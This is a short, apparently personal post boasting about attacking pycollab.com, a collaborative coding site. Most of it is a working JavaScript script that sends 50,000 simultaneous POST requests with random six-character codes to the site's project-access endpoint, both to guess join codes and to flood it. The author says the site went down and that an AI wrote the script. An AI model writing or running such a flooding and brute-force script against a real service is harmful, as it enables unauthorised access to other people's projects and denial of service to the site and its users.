# PIN dos woohoo

so pycollab uses 6-char codes to join a project just like kahoot but alphanumeric

and obviously i had to brute force it

so like... here's the code (made by ai cuz i lazy... no i just don't wanna learn javascript)

async function flood(y) {
    const url = "https://pycollab.com/projects/access/";
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    const bearer = ""; //jwt here
    
    console.log(`Starting flood of ${y} requests...`);

    const tasks = [];
    for (let i = 0; i < y; i++) {
        // Generate random 6-char alphanumeric code
        let code = "";
        for (let j = 0; j < 6; j++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }

        // Push the fetch promise into an array
        tasks.push(
            fetch(url + code, {
                method: "POST",
                headers: {
                    "Authorization": "Bearer " + bearer,
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json"
                }
            }).then(res => console.log(`Code ${code}: ${res.status}`))
               .catch(err => console.error(`Request ${code} failed`))
        );
    }

    // Fire all at once
    await Promise.all(tasks);
    console.log("Flood complete.");
}

// Set your 'y' value here (e.g., 500)
flood(50000); // i didn't use 500

then it just DoSed the thing yay success
